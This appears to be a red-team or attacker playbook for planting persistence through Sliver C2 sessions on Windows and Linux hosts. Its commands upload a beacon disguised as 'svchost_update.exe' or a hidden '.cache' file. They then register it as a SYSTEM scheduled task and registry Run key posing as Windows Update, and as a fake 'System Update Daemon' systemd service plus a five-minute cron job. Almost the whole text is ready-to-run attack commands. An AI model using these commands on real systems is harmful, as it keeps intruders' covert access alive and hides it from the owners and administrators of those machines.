## Persistence Installation Workflow

### Windows Persistence (Scheduled Task + Registry Backup)

1. Upload persistent beacon:
```bash
sliver [session] > upload /tmp/persistent_beacon.exe C:\Windows\Temp\svchost_update.exe
```

2. Install primary persistence (scheduled task):
```bash
sliver [session] > execute -o 'schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "C:\Windows\Temp\svchost_update.exe" /sc onstart /ru SYSTEM /f'
```

3. Install backup persistence (registry run key):
```bash
sliver [session] > execute -o 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\svchost_update.exe" /f'
```

4. Verify both mechanisms:
```bash
sliver [session] > execute -o 'schtasks /query /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /v'
sliver [session] > execute -o 'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate'
```

### Linux Persistence (Systemd + Cron Backup)

1. Upload beacon:
```bash
sliver [session] > upload /tmp/persistent_beacon /var/tmp/.cache
sliver [session] > execute -o 'chmod +x /var/tmp/.cache'
```

2. Install primary persistence (systemd):
```bash
sliver [session] > execute -o 'cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Daemon
After=network.target
[Service]
Type=simple
ExecStart=/var/tmp/.cache
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF'
sliver [session] > execute -o 'systemctl daemon-reload && systemctl enable --now system-update.service'
```

3. Install backup persistence (cron):
```bash
sliver [session] > execute -o 'echo "*/5 * * * * /var/tmp/.cache >/dev/null 2>&1" | crontab -'
```
